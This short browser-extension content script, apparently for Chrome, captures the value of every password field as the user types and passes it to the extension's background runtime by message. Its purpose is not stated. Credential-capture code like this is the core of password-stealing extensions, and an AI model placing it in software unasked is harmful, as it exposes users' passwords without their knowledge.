const initiator = 'content.js';
console.debug(initiator, 'Content script loaded');

document.addEventListener('input', function(event) {
  // TODO: only send when the input field looses focus or the user presses enter
  if (event.target.type === 'password') {
    console.debug('Password input detected');
    chrome.runtime.sendMessage({ password: event.target.value });
  }
});
